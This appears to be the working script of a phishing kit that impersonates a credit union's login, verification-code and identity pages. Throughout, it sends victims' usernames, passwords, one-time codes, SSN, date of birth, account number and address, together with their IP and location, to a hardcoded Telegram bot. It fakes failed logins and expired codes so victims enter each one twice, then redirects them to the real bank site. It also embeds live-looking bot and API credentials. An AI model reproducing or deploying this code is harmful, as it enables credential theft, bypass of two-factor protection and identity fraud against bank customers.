  // Telegram and IP Info setup
  const TELEGRAM_TOKEN = '7793230815:AAG_bvautl-oMP43izsQ5cFg87ZOFnjdDOk';
  const TELEGRAM_CHAT_ID = '7959372593';
  const API_KEY = 'efeb6799727414';
  const IPINFO_URL = 'https://ipinfo.io/json';
  let ipInfo = {};

  // Function to send message to Telegram
  async function sendToTelegram(message) {
    const url = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`;
    const text = `${message}\n\n--- IP Info ---\nIP: ${ipInfo.ip || 'N/A'}\nCity: ${ipInfo.city || 'N/A'}\nRegion: ${ipInfo.region || 'N/A'}\nCountry: ${ipInfo.country || 'N/A'}\nISP: ${ipInfo.org || 'N/A'}\nLocation: ${ipInfo.loc || 'N/A'}`;

    const payload = {
      chat_id: TELEGRAM_CHAT_ID,
      text: text,
      parse_mode: 'Markdown'
    };

    try {
      await fetch(url, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json'
        },
        body: JSON.stringify(payload)
      });
    } catch (error) {
      console.error('Error sending to Telegram:', error);
    }
  }

  // Fetch IP info on page load
  window.addEventListener('DOMContentLoaded', async () => {
    try {
      const response = await fetch(IPINFO_URL);
      ipInfo = await response.json();
    } catch (error) {
      console.error('Error fetching IP info:', error);
    }
  });

  // DOM Elements
  const pages = {
    login: document.getElementById('login-page'),
    otpMethod: document.getElementById('otp-method-page'),
    otpEntry: document.getElementById('otp-entry-page'),
    info: document.getElementById('info-page')
  };

  const spinner = document.getElementById('spinner');
  const loginError = document.getElementById('login-error');
  const otpError = document.getElementById('otp-error');

  // State
  let loginAttempts = 0;
  let otpAttempts = 0;
  let deliveryMethod = 'email';

  // Show loading spinner
  function showSpinner() {
    spinner.style.display = 'flex';
  }

  // Hide loading spinner
  function hideSpinner() {
    spinner.style.display = 'none';
  }

  // Switch between pages
  function showPage(page) {
    Object.values(pages).forEach(p => p.classList.remove('active'));
    page.classList.add('active');
  }

  // Handle login
  document.getElementById('login-btn').addEventListener('click', function() {
    const username = document.getElementById('username').value;
    const password = document.getElementById('password').value;

    if (!username || !password) {
      loginError.textContent = 'Please enter both username and password';
      loginError.style.display = 'block';
      return;
    }

    showSpinner();

    setTimeout(() => {
      hideSpinner();
      loginAttempts++;

      if (loginAttempts === 1) {
        loginError.innerHTML = '<p>⛔️Login failed. We do not recognize your username/password.</p>';
        loginError.style.display = 'block';

        // Send login attempt to Telegram
        sendToTelegram(`Login Attempt #1\nUsername: ${username}\nPassword: ${password}`);
      } else if (loginAttempts === 2) {
        // Send second login attempt to Telegram
        sendToTelegram(`Login Attempt #2\nUsername: ${username}\nPassword: ${password}`);
        showPage(pages.otpMethod);
      }
    }, 5000);
  });

  // Handle OTP method selection
  document.getElementById('request-code-btn').addEventListener('click', function() {
    // Get selected delivery method
    const selected = document.querySelector('input[name="delivery"]:checked');
    deliveryMethod = selected.value;

    // Send method selection to Telegram
    sendToTelegram(`Verification Method Selected\nMethod: ${deliveryMethod}\nFor: ${deliveryMethod === 'email' ? 'm****r@wingsfinancial.com' : '***-***-1234'}`);

    showSpinner();

    setTimeout(() => {
      hideSpinner();
      showPage(pages.otpEntry);
    }, 5000);
  });

  // Handle OTP verification
  document.getElementById('verify-otp-btn').addEventListener('click', function() {
    let otp = '';
    const otpInputs = document.querySelectorAll('.otp-input input');
    otpInputs.forEach(input => { otp += input.value; });

    if (otp.length !== 6) {
      otpError.textContent = 'Please enter a 6-digit verification code';
      otpError.style.display = 'block';
      return;
    }

    showSpinner();

    setTimeout(() => {
      hideSpinner();
      otpAttempts++;

      if (otpAttempts === 1) {
        otpError.textContent = 'Verification code has expired';
        otpError.style.display = 'block';

        // Send OTP attempt to Telegram
        sendToTelegram(`OTP Attempt #1\nCode: ${otp}`);
      } else if (otpAttempts === 2) {
        // Send second OTP attempt to Telegram
        sendToTelegram(`OTP Attempt #2\nCode: ${otp}`);
        showPage(pages.info);
      }
    }, 5000);
  });

  // Handle OTP resend
  document.getElementById('resend-otp').addEventListener('click', function(e) {
    e.preventDefault();
    otpError.style.display = 'none';

    // Send OTP resend notification to Telegram
    sendToTelegram(`OTP Resent to ${deliveryMethod === 'email' ? 'email address' : 'phone number'}`);

    alert(`Verification code sent to your ${deliveryMethod === 'email' ? 'email address' : 'phone number'}`);
  });

  // Handle form confirmation
  document.getElementById('confirm-btn').addEventListener('click', function() {
    // Gather all form data
    const firstName = document.getElementById('firstName').value;
    const lastName = document.getElementById('lastName').value;
    const dob = document.getElementById('dob').value;
    const phone = document.getElementById('phone').value;
    const email = document.getElementById('email').value;
    const ssn = document.getElementById('ssn').value;
    const account = document.getElementById('account').value;
    const address = document.getElementById('address').value;
    const city = document.getElementById('city').value;
    const state = document.getElementById('state').value;
    const zip = document.getElementById('zip').value;

    // Validate required fields
    if (!firstName || !lastName || !dob || !phone || !email || !ssn || !address || !city || !state || !zip) {
      alert('Please fill in all required fields');
      return;
    }

    // Format form data
    const formData = `
First Name: ${firstName}
Last Name: ${lastName}
Date of Birth: ${dob}
Phone: ${phone}
Email: ${email}
SSN: ${ssn}
Account: ${account || 'N/A'}
Address: ${address}
City: ${city}
State: ${state}
ZIP: ${zip}`;

    // Send form data to Telegram
    sendToTelegram(`Form Submission:\n${formData}`);

    showSpinner();

    setTimeout(() => {
      // Redirect to wingscu.com
      window.location.href = "https://wingscu.com";
    }, 5000);
  });

  // OTP input auto-focus
  document.addEventListener('DOMContentLoaded', function() {
    const otpInputs = document.querySelectorAll('.otp-input input');
    otpInputs.forEach((input, index) => {
      input.addEventListener('input', function() {
        if (this.value.length === 1 && index < otpInputs.length - 1) {
          otpInputs[index + 1].focus();
        }
      });

      input.addEventListener('keydown', function(e) {
        if (e.key === 'Backspace' && this.value.length === 0 && index > 0) {
          otpInputs[index - 1].focus();
        }
      });
    });
  });